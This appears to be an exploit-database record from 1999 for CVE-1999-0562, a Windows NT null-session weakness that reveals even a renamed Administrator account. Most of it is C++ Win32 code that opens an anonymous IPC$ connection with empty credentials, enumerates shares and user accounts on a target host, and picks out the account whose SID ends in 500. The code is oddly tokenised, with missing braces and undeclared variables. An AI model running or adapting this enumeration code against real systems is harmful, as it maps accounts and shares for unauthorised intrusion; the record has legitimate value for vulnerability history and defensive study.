{
    "text": "ecve : CVE-1999-0562 ， title : Microsoft Windows NT 4.0/SP 1/SP 2/SP 3/SP 4/SP 5 - Null Session Admin Name - Windows dos Exploit ， verified : Verified ， exploit_detail : source :  ， By establishing a Null session with an NT host , an intruder can gain the name of even a renamed Administrator account. This is because even Null sessions are added to the Everyone group for the duration of the connection. This was done so that hosts not in the domain could still use MS Networking's browser functions. ， First - making a NULL Session connection ， One way to this is by using the Net Use command with an empty password. Programmatically , it looks like this.... ， //This function called from dialog that fills listbox with connections ， BOOL EstablishNullSession ( CString TargetHost , CNTOHunterDlg * pDlg )  ， //Setup for UNICODE ， char * pTemp = TargetHost.GetBuffer ( 256 )  ;  ， WCHAR wszServ [ 256 ]  ;  ， LPWSTR Server = NULL ;  ， //Convert to Unicode ， MultiByteToWideChar ( CP_ACP , 0 , pTemp ,  ， strlen ( pTemp ) +1 , wszServ ,  ， sizeof ( wszServ ) /sizeof ( wszServ [ 0 ]  )  )  ;  ， //Create the IPC $ share connection string we need ， Server = wszServ ;  ， LPCWSTR szIpc = L\"\\IPC $ \" ;  ， WCHAR RemoteResource [ UNCLEN + 5 + 1 ]  ; // UNC len + \\IPC $ + NULL ， DWORD dwServNameLen ;  ， DWORD dwRC ;  ， //Setup Win32 structures and variables we need ， NET_API_STATUS nas ;  ， USE_INFO_2 ui2 ;  ， SHARE_INFO_1 * pSHInfo1 = NULL ;  ， DWORD dwEntriesRead ;  ， DWORD dwTotalEntries ;  ， //Set up handles to tree control to insert connection results ， HTREEITEM machineRoot , shareRoot , userRoot , adminRoot , attribRoot ;  ， char sharename [ 256 ]  ;  ， char remark [ 256 ]  ;  ， SetLastError ( ERROR_INVALID_COMPUTERNAME )  ;  ， dwServNameLen = lstrlenW ( Server )  ;  ， //Test for various errors in connection string and recover ， // prepend slashes and NULL terminate ， RemoteResource [ 0 ] = L'\\\\' ;  ， RemoteResource [ 1 ] = L'\\\\' ;  ， RemoteResource [ 2 ] = L'\\0' ;  ， dwServNameLen -= 2 ; // drop slashes from count ， RemoteResource [ 0 ] = L'\\0' ;  ， SetLastError ( ERROR_INVALID_COMPUTERNAME )  ;  ， //Start with clean memory ， ZeroMemory ( &ui2 , sizeof ( ui2 )  )  ;  ， //Fill in the Win32 network structure we need to use connect API ， ui2.ui2_local = NULL ;  ， ui2.ui2_remote = ( LPTSTR ) RemoteResource ;  ， ui2.ui2_asg_type = USE_IPC ;  ， ui2.ui2_password = ( LPTSTR ) L\"\" ; //SET PASSWORD TO NULL ， ui2.ui2_username = ( LPTSTR ) L\"\" ;  ， ui2.ui2_domainname = ( LPTSTR ) L\"\" ;  ， //MAKE THE NULL SESSION CALL ， nas = NetUseAdd ( NULL , 2 ,  ( LPBYTE ) &ui2 , NULL )  ;  ， dwRC = GetLastError (  )  ;  ， machineRoot = pDlg->m_Victims.InsertItem ( TargetHost , 0 , 0 ,  ， TVI_ROOT )  ;  ， //THIS IS WHERE NT HANDS OUT IT INFORMATION ， nas = NetShareEnum (  ( char *  ) Server , 1 ,  ( LPBYTE *  ) &pSHInfo1 ,  ， MAX_PREFERRED_LENGTH ,  ， &dwEntriesRead ,  ， &dwTotalEntries , NULL )  ;  ， dwRC = GetLastError (  )  ;  ， shareRoot = pDlg->m_Victims.InsertItem ( \"Shares\" ,  ， machineRoot , TVI_LAST )  ;  ， userRoot = pDlg->m_Victims.InsertItem ( \"Users\" ,  ， machineRoot , TVI_LAST )  ;  ， adminRoot = pDlg->m_Victims.InsertItem ( \"Admin\" ,  ， machineRoot , TVI_LAST )  ;  ， // Convert back to ANSI ， WideCharToMultiByte ( CP_ACP , 0 ,  ( const unsigned ， short *  ) pSHInfo1->shi1_netname , -1 ,  ， sharename , 256 , NULL , NULL )  ;  ， WideCharToMultiByte ( CP_ACP , 0 ,  ( const unsigned ， short *  ) pSHInfo1->shi1_remark , -1 ,  ， remark , 256 , NULL , NULL )  ;  ， CString ShareDetails = sharename ;  ， ShareDetails = ShareDetails + \" - \" + remark ;  ， //fill the tree with connect info ， attribRoot = pDlg->m_Victims.InsertItem ( ShareDetails ,  ， shareRoot , TVI_LAST )  ;  ， pSHInfo1++ ;  ， //My Wrapper function for listing users - see below ， DoNetUserEnum ( Server , pDlg , userRoot , adminRoot )  ;  ， //WE ARE DONE , SO KILL THE CONNECTION ， nas = NetUseDel ( NULL ,  ( LPTSTR ) RemoteResource , 0 )  ;  ， TargetHost.ReleaseBuffer (  )  ;  ， SetLastError ( nas )  ;  ， The following function is how one can programmatically determine the administrator status of an account...... ， bool GetAdmin ( char * pServer , char * pUser , CString& Name )  ， BOOL fAdmin = FALSE ;  ， DWORD dwDomainName , dwSize , dwAdminVal ;  ， SID_NAME_USE use ;  ， PSID pUserSID = NULL ; // SID for user ， int rc ;  ， int iSubCount ;  ， bool bFoundHim = 0 ;  ， dwDomainName = 256 ;  ， dwSize = 0 ;  ， dwAdminVal = 0 ;  ， iSubCount = 0 ;  ， //Call API for buffer size since we don't know size beforehand ， rc = LookupAccountName ( pServer ,  ， pUser , pUserSID ,  ， &dwSize , szDomainName ,  ， &dwDomainName , &use )  ;  ， rc = GetLastError (  )  ;  ， //Allocate a larger buffer ， pUserSID = ( PSID ) malloc ( dwSize )  ;  ， //Repeat call now that we have the right size buffer ， rc = LookupAccountName ( pServer ,  ， pUser , pUserSID ,  ， &dwSize , szDomainName ,  ， &dwDomainName , &use )  ;  ， //Scan the SIDS for the golden key - ADMIN == 500 ， //Get a count of SID's ， iSubCount = ( int )  *  ( GetSidSubAuthorityCount ( pUserSID )  )  ;  ， //Admin SID is the last element in the count ， dwAdminVal = *  ( GetSidSubAuthority ( pUserSID , iSubCount-1 )  )  ;  ， Name.Format ( \"Admin is %s\\%s\\n\" , szDomainName , pUser )  ;  ， bFoundHim = true ;  ， delete pUserSID ;  ， Wrapper for Listing the user accounts..... ， void DoNetUserEnum ( const wchar_t * pServer , CNTOHunterDlg * pDlg , HTREEITEM ， userRoot , HTREEITEM adminRoot )  ， USER_INFO_10 * pUserbuf ,  * pCurUser ;  ， DWORD dwRead , dwRemaining , dwResume , dwRC ;  ， char userName [ 256 ]  ;  ， char userServer [ 256 ]  ;  ， dwResume = 0 ;  ， //Start sting with correct UNC slashes and NULL terminate ， RemoteResource [ 0 ] = L'\\\\' ;  ， RemoteResource [ 1 ] = L'\\\\' ;  ， RemoteResource [ 2 ] = L'\\0' ;  ， dwServNameLen -= 2 ; // drop slashes from count ， RemoteResource [ 0 ] = L'\\0' ;  ， SetLastError ( ERROR_INVALID_COMPUTERNAME )  ;  ， do ， pUserbuf = NULL ;  ， //THIS IS THE API THE NT USES TO HAND OUT IT's LIST ， dwRC = NetUserEnum ( RemoteResource , 10 , 0 ,  ( BYTE ) &pUserbuf , 1024 ,  ， &dwRead , &dwRemaining , &dwResume )  ;  ， DWORD i ;  ， // Convert back to ANSI. ， WideCharToMultiByte ( CP_ACP , 0 , pCurUser->usri10_name , -1 ,  ， userName , 256 , NULL , NULL )  ;  ， // Convert back to ANSI. ， WideCharToMultiByte ( CP_ACP , 0 , pServer , -1 ,  ， userServer , 256 , NULL , NULL )  ;  ， //use char strings ， CString Admin ;  ， GotAdmin = GetAdmin ( userServer , userName , Admin )  ;  ， Admin.TrimRight (  )  ;  ， HTREEITEM adminChild = pDlg->m_Victims.InsertItem ( Admin ,  ， adminRoot , TVI_LAST )  ;  ， pDlg->m_Victims.EnsureVisible ( adminChild )  ;  ， CString strUserName = userName ;  ， pDlg->m_Victims.InsertItem ( strUserName , userRoot , TVI_LAST )  ;  ， NetApiBufferFree ( pUserbuf )  ;  ， } while ( dwRC == ERROR_MORE_DATA )  ; ",
    "time": "1999-06-28"
}